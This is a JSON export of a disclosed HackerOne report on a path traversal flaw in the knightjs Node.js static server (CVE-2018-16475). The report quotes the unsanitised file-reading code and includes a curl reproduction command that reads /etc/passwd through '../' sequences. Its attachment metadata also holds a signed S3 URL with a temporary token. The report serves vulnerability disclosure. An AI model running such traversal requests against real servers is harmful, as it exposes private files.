{
  "id": 403707,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MDM3MDc=",
  "url": "https://hackerone.com/reports/403707",
  "title": "[knightjs] Path Traversal allows to read content of arbitrary files",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "high",
  "readable_substate": "Resolved",
  "created_at": "2018-09-01T03:44:25.065Z",
  "submitted_at": "2018-09-01T03:44:25.065Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "abdilahrf_",
    "url": "/abdilahrf_",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/bsm9e70lm64ys0s633r55gvcmhcn/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 23949,
    "url": "https://hackerone.com/nodejs-ecosystem",
    "handle": "nodejs-ecosystem",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "disabled",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Node.js third-party modules",
      "twitter_handle": "",
      "website": "https://nodejs.org/en/security/",
      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
    }
  },
  "has_bounty?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2018-16475"
  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2018-11-02T10:20:46.006Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2018-11-02T10:19:40.954Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "I would like to report Path Travelsal in Knightjs\nIt allows attacker to read content of arbitary file on remote server.\n\n# Module\n\n**module name:** Knightjs\n**version:** 0.0.1\n**npm page:** `https://www.npmjs.com/package/knightjs`\n\n## Module Description\n\nknight is a simple static server without configuration on the top of Node.js.\n\n## Module Stats\n\n~ 10-20 / month\n\n# Vulnerability\n\n## Vulnerability Description\n\nThere is no sanitation to the path provided from requests\n\n```\n            fs.readFile(pathname, (err, data) => {\n                if (err) {\n                    res.statusCode = 500\n                    res.end(`Error getting the file: ${err}.`)\n                } else {\n                    res.statusCode = 200\n                    // based on the URL path, extract the file extention. e.g. .js, .doc, ...\n                    const ext = path.parse(pathname).ext\n                    // if the file is found, set Content-type and send data\n                    res.setHeader('Content-type', mime[ext] || 'text/plain')\n                    res.end(data)\n                }\n            })\n```\n\nand if the file exist they will print the data\n\n## Steps To Reproduce:\n\n- `npm i knightjs`\n- `node node_modules/knightjs/bin/knight`\n- `curl --path-as-is http://localhost:4000/../../../../../../etc/passwd -v`\n\nF340872\n\n\n# Wrap up\n- I contacted the maintainer to let them know: N]\n- I opened an issue in the related repository: N\n\n## Impact\n\nIt allows attacker to read content of arbitary file on remote server.",
  "weakness": {
    "id": 19,
    "name": "Path Traversal"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 340872,
      "file_name": "knightjs-path-traversal.PNG",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/340/872/e155d78c29b90190bb68fa9d7c24c0843e664bc0/knightjs-path-traversal.PNG?response-content-disposition=attachment%3B%20filename%3D%22knightjs-path-traversal.PNG%22%3B%20filename%2A%3DUTF-8%27%27knightjs-path-traversal.PNG&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQS4ZYC2HY%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T164834Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEI%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCV3XdXhMUMlKJxkqs3w4qL%2BBkUcCTMC2%2FoQrWMXCFBxwIgV8iyESBwh6zIxVz8akAXcrtf5rHd7XwJosuwX88judcqsQUIGBADGgwwMTM2MTkyNzQ4NDkiDPIUZremqlawl6AC3CqOBQv9CBRhl6roGlpnvbugqm6JnrsJfTAcDpvfCvv5aobcIk%2FAr6FU8%2Fx%2F8Tkc2xoZJ%2Bf4%2BK6Xn1ZZRXg7ns9Pio8IXihTjDtwmwn3%2BUZ0O%2FBmxCxexCv3kP%2FtitrQaWkbzD8mSVGR9Sr28VN%2FkFnzMV2PMWLzyw2cfVUoMcsKW2j7%2FC09%2FOZdtwl9G7cfUBsLo4dANjyyueME3iNorP2DtgVU53k%2B2R0Zmaz0IarrjNjXoFHXcTrqG8glphdpiCqKQ6n7u3xmCGICsVD%2Fs8xHoWbMrIQ01tSiLYtndl7UlOhKL%2BHCkv3tePvXqw9q9qaQb0s0WquS2qWuLknFuBMIPtgoU%2FEYXtXiKYB%2FG18ZAFQZHk5QKkxFGw4iwPM%2BbuvWwCsHV%2BAFDbofRizw32BQRU2tzy1VDAQ7P%2FRF3SWO%2BzNaX4N9gYL9kTb7Qh2WBPH4yA3OcdHbznl1qsBblTGq%2FEevFggCLLGAbLcWBl07dzug5FA%2BwPzj7TBujHE%2BZ3bWoXAQDHEaErnlcB0bx%2BkYG8liWz3%2FzxBJOFNf5ZsW6d1uFiICAg7xFHd885GRg3pdz%2B3mgn8Wso1oAwosbunbsntqt3SXgW8oq%2BZe9C5EDgRR1KhPPyuWt%2BFmSVZPMsitS9FoVxIdo4Y1qn8AKHRTGXxixv4DzO2ilUgHfaF62vnIVGY%2B5hmJkJZ2N%2Fn7gfgs%2Bgaz5t3o0H54K3qNX9pc7t8yPF%2BDRLSF1%2FXhpZeYNUd3Xci%2BlVUlyh0n9CHWKiX31yhXUOWaY4XOf6En0nGQiR3xb8%2FLJaYM1isSH7hYdAgKubNZ7x6YVJwvrc6uLlxxozyjjtudpGeylZBm2WolsoRI9HkTdRXOG80%2FgEyLAjCamcDGBjqxAaeVLAqQnpvXojIKSZgluTp9SrKGBfm5hJSrB95SqxDS1bfeAJzYQHuylT2Ni%2Fc%2FwmIXS%2BOlGVgg2MKPj%2FjBOcptwhkAyQoAzAT%2BehwEDwV9N1Is1a1tF3%2BCI6aRM2RztJl3CyAZkg22UmJp0RgJ44pUXgeOUhdVudSoiSa%2B5EL009G5OoJvIYpVEBS%2BRv2Zg9BcAWWApEbhf6MuJ4kumpnzM3hIccAaHzGbnMg2jvZL%2BA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5bcdb19e1a214f7191ee17bb5513c52305e37be0d17c32d2798c24fd748fef87",
      "file_size": 57624,
      "type": "image/png",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": "2018-12-02T10:19:41.039Z",
  "allow_singular_disclosure_after": -214727333.03417087,
  "singular_disclosure_allowed": true,
  "vote_count": 8,
  "voters": [
    "sameerphad72",
    "bobo_ka",
    "abdilahrf_",
    "n00bsec",
    "cryptographer",
    "apridos",
    "whichisbad",
    "reppie"
  ],
  "severity": {
    "rating": "high",
    "score": 8.6,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "none",
      "user_interaction": "none",
      "scope": "changed",
      "confidentiality": "high",
      "integrity": "none",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 14397,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "knightjs",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
